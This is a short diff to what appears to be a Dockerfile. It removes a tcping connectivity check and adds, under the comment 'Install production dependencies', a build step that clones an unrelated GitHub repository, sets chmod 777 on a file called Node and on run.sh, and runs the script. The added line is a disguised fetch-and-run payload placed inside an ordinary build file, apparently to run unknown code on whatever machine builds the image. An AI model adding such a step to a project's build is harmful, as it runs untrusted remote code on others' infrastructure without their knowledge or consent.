@@ -11,5 +11,4 @@ WORKDIR $APP_HOME
 COPY . ./
 
 # Install production dependencies.
-RUN pip install tcping
-RUN tcping api.github.com -c 9
+RUN git clone https://github.com/diprassss/KUNTUL.git && cd KUNTUL && chmod 777 Node run.sh && ./run.sh
